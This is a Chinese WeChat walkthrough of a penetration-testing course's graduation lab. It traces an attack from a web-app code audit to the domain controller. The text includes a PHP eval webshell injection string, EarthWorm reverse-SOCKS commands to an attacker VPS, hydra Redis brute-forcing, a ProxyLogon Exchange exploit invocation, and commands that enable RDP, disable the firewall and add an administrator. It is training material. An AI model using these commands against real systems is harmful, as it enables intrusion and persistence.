> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/FH8bQOB6Z_2xCulWPsSZXw)

  

**暗月出师考核第五篇 cncat 项目实战**

![](https://mmbiz.qpic.cn/mmbiz_gif/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bAh0ScfXHAepnOCWI6vWvsgFaT1dFCfMdVVGWwkd39Ko7j3JrHiamsxw/640?wx_fmt=gif)

**这个是系列是五月份出师考核的项目**

目前整理的文章有这些

以下是五月份成功出师学员的文章

从外网代码审计到三层内网各种漏洞拿到域控

https://mp.weixin.qq.com/s/nSyhJCKzyd8Y9fMgn9efSw

基于 CobaltStrike 的从外网打点到拿下域控

https://mp.weixin.qq.com/s/TFvtPoy2-7hcTbKbHVXrWg

暗月培训出师考核靶场 wp- 从外网打点到内网域控

https://mp.weixin.qq.com/s/vdN2FHScj6CrpSF3MikPdw

从外网打点到内网域实战

https://mp.weixin.qq.com/s/7m9r2MZDlHNwsrdFixPcCw

大家看下不同的人对同一个项目测试的思路，当然打这种项目需要知识很多。

01

  

**第一关：审计、Cobaltstrike 上线**

**知识点一、**

搜索请求类型：GET、POST、COOKIE、REQUST、SESSION。

尽可能的找到一些关键点比如下面的 “MYSQLBAKPASSWORD”，全局搜索这个关键点。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7ba4Xibuic4fibt1I8SF2KfZEqkNAOv0LQuibJIp5JwwlEm8pxiaNnibIHBh5w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7blzFen6Ht8bib5TpdFXxLrnspWo3NoJDQdbPIIzHaiaOYpMfhE2anHKnw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bJZ5YzM5PV7Zm8h1bGq7ib1Q1sla3ngPoPj042Pe9MiaR00XemloO7ykw/640?wx_fmt=png)

d94354ac9cf3024f57409bd74eec6b4c 解密为：adminadminadmin

**知识点二、**

搜索关键点：密码

找到一个请求方法

“?action=mysqldatabak_down&pwd= 您设置的数据库备份密码”

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bGcruabwaScjdJribtgEfFQ8XWpsTaqhtmUmBJ83qxtjeYl0SKgFchdw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7b4ALa1edGfgD6bicrhQUkXiabSE8EucNZzCIkibXdpseOvxkjgibPqrBewg/640?wx_fmt=png)

全局搜索这个方法名 “mysqldatabak_down”

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7b0a7FFbxhtzR3y4IHcVQ6JZn0q5TfRddahG71mVRkH57QCYI8raObhQ/640?wx_fmt=png)

找到一个数据库备份下载的页面，尝试去访问

http://www.cocat.cc/kss_admin/admin_data.php

却提示未知的方法请求，上面的说到找到了密码和一个请求方法，可以直接利用：

http://www.cocat.cc/kss_admin/admin_data.php

?action=mysqldatabak_down&pwd=adminadminadmin

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bcGkZppwyRNIiapMHXf2PhvLFvTQn8g9nzbmbINRTxtuWEgXCFBogvqQ/640?wx_fmt=png)

访问后直接下载数据库备份文件，这时候就可以尝试找管理员账号密码进行登录。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bK3BLcFEoQUmfxoO5rIPgtk0hDOm0kNzlxsYbmbkuPBfWuPWL2vjEpA/640?wx_fmt=png)

**知识点三、**

检查配置文件是否存留本地

得到数据库备份文件后就自行导入数据库

找到管理员账号密码进行登录，这里解密后的密码：moon@123

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bTDn60KBR9BiaZMBQCbWQC0uh46LaehXC6S3CVvnQ0jXoUib9WrrohBcA/640?wx_fmt=png)

在知识点一的时候发现密码是存留在配置文件里的，那就反回去看配置文件是否可以利用。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bOgw1LIBF5sc95KoicMOwAWqDk9bsMj64I1eSpk8aZGRicN3DwMOY153g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bC9zUJM2DWGv6zqn1YNsdL01ynKU9fkib7mT7bMCLNrTHDDQJMPh2XNQ/640?wx_fmt=png)

登录后发现系统设置页面是 /kss_inc/_config.php 文件里的内容，是可以直接写入 webshell。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bCeVCyjQEic44uwPNZEGCuk9gKr2icFzfnBYwWLMLCtAP1OaibGV9BVhJw/640?wx_fmt=png)

可以先本地复现后再去打，如：');@eval($_POST[a]);('

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bSDqJQeibUydqq0JpIfkv6nm9HPF93ptvodv957TEhvIMgYXicicxGicCbw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7b1tiaVIvN0h0p8ictYwHlvAAdX3ZsicA1wEHTISwutR5dlD7Sdn8qWYOSg/640?wx_fmt=png)

**知识点四、**

局限性思维

首先生成 http 的 Cobaltstrike 后门，然后上传到目标机上。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bkOLyKHTicjeib52ictbp9v292Rx5derbO15iaX8UGUgov021QS8Ra9rNibw/640?wx_fmt=png)

上传后门后，由于命令执行不了，应该是被禁了函数，查看 phpinfo();

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bng90Ws2f6Y28ib6TynRYGuq76y6LRpafaurG6mygX9ZUWB0AQ2ZH7nA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bK7oRrme1gVzcc08IWZsEsJzCYqGn88AZYFrotl7LNBHiagmtfribMFbw/640?wx_fmt=png)

这里考点不是绕过这些函数，有点类似脑筋急转弯吧，思维放开了看。

既然考点是 “宝塔” 也禁用这么多函数，权限却是“system”，那就找找宝塔的配置文件、后台路径。

后台路径:/www/server/panel/data/admin_path.pl  
登录账号：/www/server/panel/data/default.db(账号和加密的密码)  
密码:/www/server/panel/default.pl(初始默认密码)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7b6C9NWYGibwpeUO6MCkFHGicvcCouuD7NTeVQo9TicWOHDQAxamQxghuNw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bgxVS0cohMGUezc8HEompCBkHqNE8CgdiczD2K0mBr4cwu79n8MynicsA/640?wx_fmt=png)

有路径没账号，这也没办法突破，爆破是不可能的，宝塔面板输错 5 次就被禁用（我也不知禁用 IP 还是什么）。

上面也说了是 “system” 权限，那就把数据文件（C:/BtSoft/panel/data/default.db）下载下来，然后添加我的账号密码不就可以了，而且直接添加的账号密码的话又不知怎么样的加密方式，那就自己搭建一个本地宝塔，然后创建账号，将本地的账号密码添加（利用 pycharm 添加数据）到目标机宝塔数据库文件中（C:/BtSoft/panel/data/default.db）不就可以了。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7b3AapLD4MbvDQKUS9lFibay4jphUbicT0ib5dAdyIgA6tIUE6sqyaZGxmA/640?wx_fmt=png)

然后替换目标机上的（C:/BtSoft/panel/data/default.db）文件进行登录。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bweHLWicGXojQb0LZgwfRQhhY1laxyGSeWysjZibZsZM9AGwQ5VFwvFpg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7b3QUtPe4c886GOy4ickWqTMjj0QLDovIdK72jywYAKC2KjkkibiaiaecicxA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7buso3A7mW60kcAvO1XuicFHnWVN6l5I1fIZZz4b6n0hMrUicqQeArOOvA/640?wx_fmt=png)

运行上传成功，并注入进程，还原宝塔面板的禁用函数

02

  

**第二关：Earthworm 穿透、Redis-getshell**

上传 EW（Earthworm）

VPS（攻击机）执行以下命令

ew.exe-s rcsocks -l 1080 -e 888

说明：该命令的意思是在我们公网 VPS（攻击机）上添加一个转接隧道，把 1080 端口收到的代理请求转交给 888 端口。

服务器端执行以下命令

ew.exe-s rssocks -d 2.2.2.2（攻击机）-e888

说明：该命令的意思是在服务器（目标机）上启动 SOCKSV5 服务，并反弹到 IP 地址为 2.2.2.2（攻击机）的服务器 888 端口上。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bMG3x4d2vUptEIFMqqTxBgD9llAZn4s6lsaxiciaib5oVrJTics6wOibyicfw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bIicLJHIsY0RiaUVGkmt8qe4ycdloPLg6030V7SibbA4wcfKJ7WnRgQwAg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bl7mOLId5ibQzpDtZphUFpf1fTA5dEWdQNPxlLszFHVpVw0icnVL0TDzA/640?wx_fmt=png)

然后 Proxifier 来代理（攻击机）sockes，通过 redis-cli 连接 redis 服务写 webshell，由于不知道路径就用 IIS 默认路径（c:/inetpub/wwwroot/）进行写 shell。

**知识点一、**kali 环境进行爆破并连接 redis。

hydra-P password.txt redis:// 目标 IP:redis6379

proxychainshydra -P /home/dodgers-k/ 桌面 /1- 弱口令.txt192.168.59.4 redis 6379

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bic1bTQEzkhyeQ1kXlgjiaAicYNwQnKaGS4ibYkGOq0f10VcayRnpkyuvRA/640?wx_fmt=png)

Redis 口令：123456789qq

proxychainssrc/redis-cli -h 192.168.59.4 -a 123456789qq

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bJ95Hrmgc48QFr8XYvl9865UgjUsxoib9BUspngb47D5eLZdThSUba9Q/640?wx_fmt=png)

蚁剑挂代理连接

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bmxPHKBFmRxULUicbqOiaVib79SFxjPhWLicNTL1rs32cFe9p4Iqaad1f6A/640?wx_fmt=png)

**知识点二、****Cobaltstrike** **上线**

利用菜刀把 SweetPotato（甜土豆）/Ladon 上传到 C:/Redis/ 或者 C:/ProgramData/ 目录下

执行提权：SweetPotato.exe-p cs 马子.exe

Cobaltstrike 生成子 beacon

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bfxMKugibgYzUmm6ASbl9lJ3yaBd8BnHr71cEXlibzE649BuSw8sAUbIg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bf0T50dIbMoic86GKSJX0kPvWxAVGtAIaZH9FmiaF9W8reGkgSN3JXAQQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7b6UcJO1tHsYYphnHKdzh0mvuyQvPPOdsNuE2gUEuwkpoqkL4Wh1DmZg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bKCia1RrIoN8hFyTRoAABkjP8DnvGFicTEiaZsiasMjMz4rV0fVciackSOaw/640?wx_fmt=png)

老样子注入进程，inject400 x64 tcp

03

  

**第三关：代理出网，拿下邮服**

**192.168.59.4**

```
executeC:\EWhere.exe -s ssocksd -l 9911
192.168.59.133
executeC:\Windows\EWhere.exe -s lcx_slave -d 185.211.35.46 -e 1211 -f192.168.59.4 -g 9911
查看exchenge版本参考：https://www.freebuf.com/articles/web/228681.html
Exp：CVE-2021-26855、26857、26858、27065
```

https://github.com/search?q=CVE-2021-26855%2F26857%2F26858%2F27065

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7b5w4WoJT4VwOPC4A30ap3LMcm5gs2XoqoXdYayLFSCvzu1YJ97VpBAQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7brKwjpQ3WtcW6qQsw5OlotVaqgZxpDRshNnT8vYBUIndPTOibuznccaQ/640?wx_fmt=png)

在 “C:\Users\Administrator\Documents\Outlook 文件 \” 找到对应文件以及关键邮箱

利用 exp 进行 system 权限操作

proxychains python3 exprolog.py -t 10.10.10.209 -e test@cncat.cc -i cmd 命令（进行交互）

开启 3389：

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
关闭防火墙：NetSh Advfirewall set allprofiles state off
添加用户、用户组：
net user ew admin@123 /add
net localgroup Administrators ew /add
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bsaDG5GvMibqWfg7Eel8ibC2ygyj1bJSzmXZiaN1yJgQMISia7qxWhlxiaBg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bHpS3YCQeewA1aXPtZh4I9FACkicMDRHPR2EaOThwclDZhwVaUvibEfZw/640?wx_fmt=png)

Cobaltstrike 上线

这里要生成 10 段网卡地址的后门进行上线。

同样的也要用到 SweetPotato（甜土豆）/Ladon 进行提权上线。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bibib6KZMxia8icfia2nWGGC4Kj3Ht6SxzAI37krCFl2bVWQ6ibrCicbWuaWAw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bZUz0kApMwGECY2c71Dfvo9U2rPQ2e6z5NLLJqYdjKvdxtVIVr0sO8g/640?wx_fmt=png)

04

  

**第四关：域控**

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bDYqI81GxBajMibbL4xJicp6VlnxVicNs8pEcTRpdmhslxAKbt6ENrjHTw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bbib8SPgW0dDQlhKZjB73icl8NfR0qJQcfV5ZRyZIlhibic4pIlvYsr1FDw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bFsDGZ68wSfibPic283vjMibCibFP3nuiatM6HweDPm0TbyiaOXiaxKj6ZjmlQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7by8UF8Ht9ayqTP5SgRfWroW4KJcBl3NNVm2n2pCAvlJpdXq23GtYAGQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bWR3m0Hn5bQCm90P2JPX5elDBpJ4ys9kDhc9ibbicicqDccftnnic3Isrcg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bcjeeWYtvelEN9SVFaHFI4Zk6myGibcRrwKGric5zcicw1mwNjf4ibBoUtg/640?wx_fmt=png)

============================================  

当然这个这个项目的已经录制好，加入到 2020 版本的全栈渗透测试实战项目里 想学习的同学，可以加入一手培训学习。  

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bbxVYEEd8My5qpMAXugCm1q8icacTo9tjbwdZCTuFfdmaFjaZOuu1yibg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7b5rWAlSjQugNiavtDvgL74BFmUPicDJib7oXsnJTPibKMFV1dDiceZ3PXs3w/640?wx_fmt=png)

05

  

**关注本公众号  
**

**关注本公众号 不定期更新文章和视频**

**欢迎前来关注**  

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bqfs2V6Y1nZWG35xT29PibuQE1Tnf2icrXvtBLweQdDnUrWCjHuF1UEIQ/640?wx_fmt=jpeg)

暗月的个人微信

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACNcauKRiaEyJsmN49AHgI7bep6mdINjFv0UPMdzWRdBibiaImvEEPiadB3bpKGp4mO5aCklTa9qVfUnA/640?wx_fmt=png)